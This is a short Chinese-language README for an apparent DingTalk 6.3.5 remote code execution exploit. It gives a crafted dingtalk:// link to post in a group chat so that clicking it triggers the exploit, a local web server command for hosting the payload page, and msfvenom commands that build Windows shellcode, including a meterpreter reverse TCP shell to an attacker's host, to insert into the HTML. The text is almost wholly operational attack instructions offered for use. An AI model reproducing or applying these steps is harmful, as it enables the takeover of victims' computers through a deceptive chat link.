# dingtalk-RCE

## 来源

[https://github.com/crazy0x70/dingtalk-RCE](https://github.com/crazy0x70/dingtalk-RCE)

## 漏洞版本

6.3.5

## 触发方式

```
dingtalk://dingtalkclient/page/link?url=127.0.0.1/test.html&pc_slide=true
```

## 使用方式

本地打开`web`服务

```shell
python -m http.server
```

发送`dingtalk://dingtalkclient/page/link?url=127.0.0.1:8080/test.html&pc_slide=true`至群组，点击该链接触发。

## shellcode修改

使用msf生成shellcode

```shell
msfvenom -a x86 –platform windows -p windows/exec cmd="<命令>" -e x86/alpha_mixed -f csharp
```

反弹shell

```shell
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f csharp
```

替换shellcode至`html`文件，位置如下

```
var shellcode=new Uint8Array([.....])
```
